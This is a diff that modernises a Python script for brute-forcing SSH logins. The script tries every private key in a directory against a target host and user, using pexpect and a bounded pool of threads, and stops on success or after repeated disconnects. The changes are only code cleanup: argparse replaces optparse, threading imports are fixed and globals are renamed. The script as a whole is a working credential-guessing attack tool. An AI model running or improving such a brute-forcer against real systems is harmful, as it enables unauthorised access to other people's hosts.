@@ -1,29 +1,24 @@
 ''' 
         brute forcing using ssh key 
-    TODO:
-        1. remove optparse and use argparse
-            1.1 refactor main function to use argparse 
-        2. remove wildcard import for threading
-        3. fix naming convention issues 
-        4. import sys and convert exit to sys.exit
-        5. fix child threading issue
+
 '''
 
 import os
-import optparse
-from threading import *
+import sys
+import argparse
+import threading
 import pexpect
 
 
-maxConnections = 5
-connection_lock = BoundedSemaphore(value=maxConnections)
-Stop = False
-Fails = 0
+MAX_CONNECTIONS = 5
+connection_lock = threading.BoundedSemaphore(value=MAX_CONNECTIONS)
+STOP = False
+FAILS = 0
 
 def connect(user, host, keyfile, release):
     ''' connect to the host'''
-    global Stop
-    global Fails
+    global STOP
+    global FAILS
     try:
         perm_denied = 'Permission denied'
         ssh_newkey = 'Are you sure you want to continue'
@@ -38,41 +33,41 @@ def connect(user, host, keyfile, release):
             connect(user, host, keyfile, False)
         elif ret == 3:
             print('[-] Connection Closed By Remote Host')
-            Fails += 1
+            FAILS += 1
         elif ret > 3:
             print('[+] Success. ' + str(keyfile))
-            Stop = True
+            STOP = True
     finally:
         if release:
             connection_lock.release()
 
 def main():
     ''' main function '''
-    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -d <directory>')
-    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
-    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
-    parser.add_option('-u', dest='user', type='string', help='specify the user')
-    (options, args) = parser.parse_args()
-    host = options.tgtHost
-    passDir = options.passDir
-    user = options.user
+    parser = argparse.ArgumentParser(usage='brute_key.py -H TARGET_HOST -u USER -d DIRECTORY')
+    parser.add_argument('-H', dest='tgtHost', type=str, help='specify target host')
+    parser.add_argument('-d', dest='passDir', type=str, help='specify directory with keys')
+    parser.add_argument('-u', dest='user', type=str, help='specify the user')
+    args = parser.parse_args()
+    host = args.tgtHost
+    passDir = args.passDir
+    user = args.user
     if host is None or passDir is None or user is None:
         print(parser.usage)
-        exit(0)
+        sys.exit(0)
 
     for filename in os.listdir(passDir):
-        if Stop:
+        if STOP:
             print('[*] Exiting: Key Found.')
-            exit(0)
-        if Fails > 5:
+            sys.exit(0)
+        if FAILS > 5:
             print('[!] Exiting: Too Many Connections Closed By Remote Host.')
             print('[!] Adjust number of simultaneous threads.')
-            exit(0)
+            sys.exit(0)
         connection_lock.acquire()
         fullpath = os.path.join(passDir, filename)
         print('[-] Testing keyfile ' + str(fullpath))
-        t = Thread(target=connect, args=(user, host, fullpath, True))
-        child = t.start()
+        t = threading.Thread(target=connect, args=(user, host, fullpath, True))
+        t.start()
 
 if __name__ == '__main__':
     main()
